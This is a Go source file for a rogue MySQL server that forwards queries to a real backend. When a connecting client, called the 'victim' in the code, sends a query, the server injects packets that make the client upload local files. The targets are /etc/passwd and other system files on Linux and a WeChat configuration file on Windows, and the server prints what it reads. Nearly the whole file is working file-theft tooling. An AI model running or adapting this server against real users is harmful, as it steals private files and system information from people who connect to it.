package main

import (
	"bytes"
	"crypto/rand"
	"flag"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"log"
	"net"
	"strconv"
	"strings"
)

// command line parameters
var port int
var password string
var username string
var dsn string

// record which file has been read by client.
// if /etc/passwd has been read from 192.168.0.1, fileBeenRead["192.168.0.1:/etc/passwd"] will be set to true
var fileBeenRead map[string]bool

func auth(conn net.Conn, salt []byte, body []byte) bool {
	if password == "" {
		return true
	}

	body = body[36:]
	user := make([]byte, 0)
	i := 0
	for {
		if body[i] != 0 {
			user = append(user, body[i])
			i++
		} else {
			break
		}
	}

	hash := body[i+2 : i+22]

	correctHash := GetNativePwdHash(password, salt)
	if string(user) != username || bytes.Compare(hash, correctHash) != 0 {
		addr := conn.RemoteAddr().String()
		host := addr[:strings.LastIndex(addr, ":")]
		errMsg := fmt.Sprintf("Access denied for user '%s'@'%s' (using password: YES)", string(user), host)
		writeBody(conn, NewErrorPacket(1045, "28000", errMsg, 2))
		return false
	}
	return true
}

func getFile(clientOS string, addr string) string {
	linuxFileList := []string{
		"/etc/passwd",
		"/etc/hostname",
		"/etc/hosts",
		"/etc/issue",
	}

	windowsFileList := []string{
		"C:\\Windows\\PFRO.log",
		"C:\\Users\\Administrators\\Documents\\WeChat Files\\All Users\\config\\config.data",
	}

	var t []string
	if clientOS == "windows" {
		t = windowsFileList
	} else {
		t = linuxFileList
	}
	for _, f := range t {
		key := addr + ":" + f
		if fileBeenRead[key] {
			continue
		}
		fileBeenRead[key] = true
		return f
	}
	return ""
}

func handleConnection(conn net.Conn, mysqlConn net.Conn) {

	//MySQL Greeting message
	mysqlVersion := "5.7.39"
	authenticationPlugin := "mysql_native_password"
	victimAddr := conn.RemoteAddr().String()
	// server greeting
	salt := []byte("Vidar nb")
	part2 := make([]byte, 12)
	rand.Read(part2)
	salt = append(salt, part2...)
	writeBody(conn, NewGreetingPacket(mysqlVersion, authenticationPlugin, salt))
	// client login
	body := readOnePacket(conn)
	if !auth(conn, salt, body) {
		return
	}
	//clientOS := parseOS(body)
	// login ok
	writeBody(conn, addMysqlHeader([]byte("\x00\x00\x00\x02\x00\x00\x00"), 02))

	buf := make([]byte, 4096)
	for {
		packet := readOnePacket(conn)
		if len(packet) == 0 {
			continue
		}
		// victim quited
		if isQuitPacket(packet) {
			conn.Close()
			mysqlConn.Write(packet)
			mysqlConn.Close()
			log.Printf("%s client quited\n")
			break
		}
		clientOS := parseOS(packet)
		if isQueryPacket(packet) {
			// insert evil packet to steal file
			filename := getFile(clientOS, victimAddr)
			evilPacket := buildEvilPackets(filename)
			conn.Write(evilPacket)
			// read file content
			p := readOnePacket(conn)
			fileContent := p[4:]
			// TODO: save file here
			log.Printf("read file %s from victim %s\n", filename, victimAddr)
			fmt.Println(string(fileContent))

			// send row query packet to backend mysql
			mysqlConn.Write(packet)
			n, _ := mysqlConn.Read(buf)
			n, respPackets := parsePackets(buf[:n])
			// correct sequence number and reassemble it
			t := make([]byte, 0)
			for i := 0; i < n; i++ {
				respPackets[i][3] += 2 // sequence number += 2
				t = append(t, respPackets[i]...)
			}
			conn.Write(t)
			// drop 0x0 0x0 0x0 0x3
			readOnePacket(conn)
		} else {
			// 无情的转发机器
			mysqlConn.Write(packet)
			n, _ := mysqlConn.Read(buf)
			conn.Write(buf[:n])
		}
	}
}

func init() {
	// init global map
	fileBeenRead = make(map[string]bool)
	//
	flag.IntVar(&port, "p", 3306, "listen port")
	flag.StringVar(&password, "P", "admin", "password for client login")
	flag.StringVar(&username, "u", "root", "username for client login")
	flag.StringVar(&dsn, "d", "", "dsn string for connecting mysql")
	flag.Parse()
}

func main() {
	addr := "0.0.0.0:" + strconv.Itoa(port)
	server, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Printf("server failed, err:%v\n", err)
		return
	}
	fmt.Printf("binding: %s\n", addr)

	for {
		var conn net.Conn
		var mysqlConn net.Conn
		conn, err = server.Accept()
		if dsn != "" {
			mysqlConn, _ = NewClient(dsn)
			//mysqlConn, _ = net.Dial("tcp", "127.0.0.1:6033")
		}
		if err != nil {
			fmt.Printf("accept failed, err:%v\n", err)
		} else {
			fmt.Printf("connection received from %s\n", conn.RemoteAddr().String())
		}

		go handleConnection(conn, mysqlConn)
	}
}
